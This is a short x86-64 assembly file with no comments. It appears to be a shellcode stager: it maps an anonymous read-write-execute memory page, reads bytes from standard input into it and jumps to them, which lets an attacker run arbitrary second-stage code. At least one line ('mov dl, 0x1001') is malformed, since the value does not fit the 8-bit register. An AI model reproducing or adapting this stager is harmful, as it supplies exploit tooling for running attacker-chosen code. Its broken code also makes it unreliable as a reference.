BITS 64
	GLOBAL _start

_start:
xor rax, rax

xor rdi, rdi
xor rsi, rsi
mov si, 0x1001
mov dl, 0x7
xor r10, r10
mov r10b, 0x22
sub r8, 1
xor r9, r9
mov rax, 9
syscall

mov rsi, rax
mov dl, 0x1001
xor rdi, rdi
xor rax, rax
syscall

jmp rsi
